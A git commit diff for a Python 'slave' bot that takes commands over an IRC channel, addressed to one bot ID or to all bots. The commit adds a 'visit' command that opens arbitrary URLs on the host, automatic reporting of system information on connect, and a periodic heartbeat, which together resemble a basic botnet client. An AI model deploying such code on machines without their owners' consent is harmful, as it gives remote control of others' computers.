975259be28437b72f142024fe9ae2caa5f670883
bufgix <ooruc471@yandex.com>
2019-06-15 16:53:43 +0300

    Pong interval

--- slave/lib/bots.py
+++ slave/lib/bots.py
@@ -4,23 +4,23 @@ from tkinter import Tk, Label
 from threading import Thread
 import platform
 import time
+import webbrowser
 
 
 BotBasic = Bot()
 
-@BotBasic.register('quit', all=True)
+@BotBasic.register('quit', all=True, help_text="Kill bot -- Usage: $quit [/all | <bot_id>]")
 def exit_server(bot: Bot, args: List[str]):
     bot.exit_server()
 
 
-@BotBasic.register('info', all=True)
-def sys_info(bot: Bot, args:List[str]):  
+@BotBasic.register('info', all=True, help_text="Information of bot machine -- Usage: $info [/all | <bot_id>]", on_connect=True)
+def sys_info(bot: Bot, args:List[str]=None):  
     template = f"OS: {platform.system()} {platform.release()} -- Processor: {platform.processor()}"
     bot.send_text(template)
-
-
-
-@BotBasic.register('message', all=True)
+    
+    
+@BotBasic.register('message', all=True, help_text="Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>")
 def show_msg_with_tk(bot: Bot, args: List[str]):
     win = Tk()
     win.title("Slave Message")
@@ -35,3 +35,8 @@ def show_msg_with_tk(bot: Bot, args: List[str]):
     
     bot.send_text("Opening tkinter frame...")
     win.mainloop()
+
+@BotBasic.register('visit', all=True, help_text="Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>")
+def vist_url(bot: Bot, args: List[str]):
+    bot.send_text(f"Opening page... {args[1]}")
+    webbrowser.open(args[1])
--- slave/lib/client.py
+++ slave/lib/client.py
@@ -1,10 +1,12 @@
+from typing import Any, List, Callable
+from threading import Timer
 import socket
 import re
 import secrets
 import logging
 import platform
 import functools
-from typing import Any, List, Callable
+
 
 RE_PARSE_PRIVMSG = r"^:(?P<owner>\w+)!.+PRIVMSG\s+#(?P<channel>\w+)\s+:\$(?P<commandstr>.+)"
 RE_PARSE_COMMADSET = r"(?P<command>\w+)\s*(?P<args>.*)"
@@ -15,6 +17,31 @@ logging.basicConfig(level=logging.DEBUG)
 def send_bytes(string: str, encoding: str = "utf-8") -> bytes:
     return bytes(string, encoding)
 
+
+class RepeatedTimer(object):
+    def __init__(self, interval, function, *args, **kwargs):
+        self._timer = None
+        self.interval = interval
+        self.function = function
+        self.args = args
+        self.kwargs = kwargs
+        self.is_running = False
+        self.start()
+
+    def _run(self):
+        self.is_running = False
+        self.start()
+        self.function(*self.args, **self.kwargs)
+
+    def start(self):
+        if not self.is_running:
+            self._timer = Timer(self.interval, self._run)
+            self._timer.start()
+            self.is_running = True
+
+    def stop(self):
+        self._timer.cancel()
+        self.is_running = False
 
 
 class Bot:
@@ -30,8 +57,9 @@ class Bot:
         self.bot_fullname = f"{self.bot_prefix}_{self.bot_id}"
         self.SERVER_STATUS = True
         self.COMMAND_SET = dict()
+        self.ping_timer: RepeatedTimer = None
 
-    def read_config_from_dict(self, config:dict) -> None:
+    def read_config_from_dict(self, config: dict) -> None:
         for key, value in config.items():
             setattr(self, key, value)
 
@@ -45,10 +73,20 @@ class Bot:
         for line in text.split('\n'):
             self.sock.send(send_bytes(f"PRIVMSG {self.channel} :{line}\n"))
 
+    def pong(self):
+        self.send_text("**Im alive**")
+
     def exit_server(self):
         self.sock.send(send_bytes("QUIT \n"))
         self.sock.close()
+        self.ping_timer.stop()
         self.SERVER_STATUS = False
+
+    def execute(self, func_dict, args: List[str]):
+        if func_dict['all'] and args[0] == '/all':
+            func_dict['func'](bot=self, args=args)
+        if self.bot_id == args[0]:
+            func_dict['func'](bot=self, args=args)
 
     def parse_command(self, raw_data: bytes):
         msg_match = re.match(RE_PARSE_PRIVMSG, raw_data)
@@ -63,10 +101,7 @@ class Bot:
 
                     st = self.COMMAND_SET.get(command, None)
                     if st is not None:
-                        if st['all'] and args[0] == '/all':
-                            st['func'](bot=self, args=args)
-                        if self.bot_id == args[0]:     
-                            st['func'](bot=self, args=args)
+                        self.execute(st, args)
                     else:
                         self.send_text(f"Command not found")
                         logging.error("Commmand not found")
@@ -90,12 +125,26 @@ class Bot:
         self.join_channel()
         logging.debug(f"Connected {self.host}")
 
+    def send_command_help(self) -> None:
+        for cmdstr, cmd_stuff in self.COMMAND_SET.items():
+            self.send_text(f"{cmdstr}: {cmd_stuff['help_text']}")
+
+    def connected_afer(self):
+        self.send_command_help()
+        for cmdstr, cmd_stuff in self.COMMAND_SET.items():
+            if cmd_stuff['on_connect'] == True:
+                cmd_stuff['func'](bot=self)
+
+        self.ping_timer = RepeatedTimer(60, self.pong)
+
     def start(self):
         self.connect()
+        self.connected_afer()
         self.listen_forever()
 
-    def register(self, cmdstr, all=False):
+    def register(self, cmdstr, all=False, on_connect=False, help_text="No description given"):
         def wrap_register(func):
-            self.COMMAND_SET[cmdstr] = {'all': all, 'func': func}
+            self.COMMAND_SET[cmdstr] = {
+                'all': all, 'on_connect': on_connect, 'help_text': help_text, 'func': func}
             return func
         return wrap_register
